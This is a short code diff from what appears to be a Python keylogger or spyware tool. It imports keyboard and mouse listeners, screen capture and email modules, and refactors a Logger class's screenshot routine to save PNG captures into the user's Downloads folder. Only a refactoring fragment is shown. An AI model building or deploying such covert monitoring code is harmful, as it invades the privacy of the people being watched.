@@ -1,6 +1,4 @@
 # Third Party Modules
-import threading
-
 from pynput.keyboard import Listener as k_Listener
 from pynput.mouse import Listener as m_Listener
 import mss.tools
@@ -17,7 +15,6 @@ import time
 import requests
 import socket
 import random
-import base64
 import sys
 import smtplib
 
@@ -165,20 +162,11 @@ class Logger:
             # Get the entire PNG raw bytes
             raw_bytes = mss.tools.to_png(im.rgb, im.size)
 
-        return base64.b64encode(raw_bytes).decode()
+        return raw_bytes
 
     def write_screenshot(self):
 
-        # TODO Refactor code
-
-        with mss.mss() as screen:
-            # Select all monitors
-            monitor = screen.monitors[0]
-            # Grab the picture
-            im = screen.grab(monitor)
-            # Get the entire PNG raw bytes
-            raw_bytes = mss.tools.to_png(im.rgb, im.size)
-
+        raw_bytes = self.get_screenshot()
         filepath = os.path.expanduser('~') + '/Downloads/'
         filename = self.user + str(random.randint(11111, 99999)) + '.png'
         path = filepath + filename
